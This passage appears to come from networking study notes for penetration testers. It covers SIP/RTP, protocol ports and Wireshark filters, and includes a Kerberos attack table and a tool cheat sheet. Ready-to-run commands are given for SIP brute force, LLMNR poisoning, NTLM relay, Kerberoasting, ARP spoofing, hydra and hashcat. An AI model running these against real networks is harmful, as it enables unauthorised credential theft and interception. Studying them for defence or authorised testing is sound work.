| REGISTER | Register user agent location |
| OPTIONS | Query capabilities |

### RTP — Real-time Transport Protocol

RTP carries the **actual audio/video data** during a VoIP call. Dynamic ports (usually 16384–32767 UDP).

**Wireshark filter**: `sip` / `rtp`

### Pentest Lens — SIP/RTP

```bash
# SIPvicious — SIP network scanner and attack tool
svmap 192.168.1.0/24          # Discover SIP devices
svwar -e100-200 192.168.1.10  # Enumerate SIP extensions
svcrack -u100 -d passwords.txt 192.168.1.10  # Brute force extension

# Capture and replay RTP audio (if no SRTP encryption)
# Wireshark: SIP stream → Telephony → VoIP Calls → Play Streams
```

**Misconfigurations**:
- SIP without TLS → registration credentials captured in cleartext
- RTP without SRTP encryption → audio capturable from MITM position
- Default SIP passwords → extension brute force trivial

---

## Quick Reference — Module 3

### Protocol Port Reference
| Protocol | Port(s) | Transport | Notes |
|----------|---------|-----------|-------|
| FTP | 20, 21 | TCP | Cleartext — use SFTP |
| SSH / SFTP | 22 | TCP | Encrypted |
| Telnet | 23 | TCP | Cleartext — disable |
| SMTP | 25, 465, 587 | TCP | 587+STARTTLS preferred |
| DNS | 53 | TCP/UDP | Zone transfer = TCP |
| DHCP | 67, 68 | UDP | |
| TFTP | 69 | UDP | Cleartext, no auth |
| HTTP | 80 | TCP | Cleartext |
| Kerberos | 88 | TCP/UDP | |
| POP3 | 110, 995 | TCP | 995 = over TLS |
| NTP | 123 | UDP | |
| NetBIOS-NS | 137 | UDP | |
| NetBIOS-SSN | 139 | TCP | |
| IMAP | 143, 993 | TCP | 993 = over TLS |
| SNMP | 161, 162 | UDP | v3 only in prod |
| LDAP | 389, 636 | TCP | 636 = LDAPS |
| HTTPS | 443 | TCP | HTTP over TLS |
| SMB | 445 | TCP | |
| LDAP GC | 3268, 3269 | TCP | 3269 = over TLS |
| RDP | 3389 | TCP/UDP | |
| SIP | 5060, 5061 | UDP/TCP | 5061 = TLS |
| mDNS | 5353 | UDP | |
| LLMNR | 5355 | UDP | Disable in prod |
| WinRM/HTTP | 5985 | TCP | PowerShell remoting |
| WinRM/HTTPS | 5986 | TCP | Encrypted |

### Wireshark Protocol Filters
```
tcp.flags.syn==1 && tcp.flags.ack==0   # New TCP connections
http.request.method=="POST"             # HTTP POST (credentials)
ftp                                     # FTP (cleartext creds visible)
smtp                                    # SMTP (check for AUTH LOGIN)
snmp                                    # SNMP (community string visible)
nbns                                    # NetBIOS name resolution
llmnr                                   # LLMNR — watch for poisoning
arp.duplicate-address-detected          # Potential ARP spoofing
icmp.type==8                            # Ping sweep
```

### Kerberos Attack Summary
| Attack | Pre-requisite | What You Get |
|--------|--------------|-------------|
| AS-REP Roasting | No auth needed (any network access) | Hash of user with no pre-auth — offline crack |
| Kerberoasting | Valid domain credentials | Hash of service account — offline crack |
| Pass-the-Ticket | Ticket file | Impersonate user for ticket's lifetime |
| Golden Ticket | krbtgt hash (DA required) | Permanent DA access to domain |
| Silver Ticket | Service account hash | Access to specific service |

### Attack Tool Reference
| Tool | Protocol/Attack | Key Command |
|------|----------------|-------------|
| Responder | LLMNR/NBT-NS poisoning | `responder -I eth0 -v` |
| ntlmrelayx.py | NTLM relay | `ntlmrelayx.py -tf targets.txt -smb2support` |
| GetNPUsers.py | AS-REP roasting | `GetNPUsers.py domain/ -usersfile users.txt` |
| GetUserSPNs.py | Kerberoasting | `GetUserSPNs.py domain/user:pass -request` |
| arpspoof | ARP poisoning | `arpspoof -i eth0 -t <victim> <gateway>` |
| bettercap | MITM framework | `bettercap -iface eth0` |
| hydra | Brute force | `hydra -L users.txt -P pass.txt ssh://target` |
| onesixtyone | SNMP community brute | `onesixtyone -c dict.txt <target>` |
| snmpwalk | SNMP enumeration | `snmpwalk -v2c -c public <target>` |
| hashcat | Hash cracking | `hashcat -m 5600 hashes.txt rockyou.txt` |

---

## Related Notes
- [[Module-00-Foundations]] — OSI layers where each protocol operates
- [[Module-01-IP-Addressing]] — DNS, DHCP covered in depth
- [[Module-02-Devices-Infrastructure]] — ARP and Ethernet framing
- [[Module-04-Network-Security]] — TLS, 802.1X, Zero Trust
- [[Module-07-Windows-Server-Networking]] — Kerberos, LDAP, SMB in AD context
- [[Module-11-Tools-Reference]] — Wireshark, tcpdump, Nmap deep dive
- [[Module-12-Pentest-Perspective]] — All these protocols in full engagement workflow
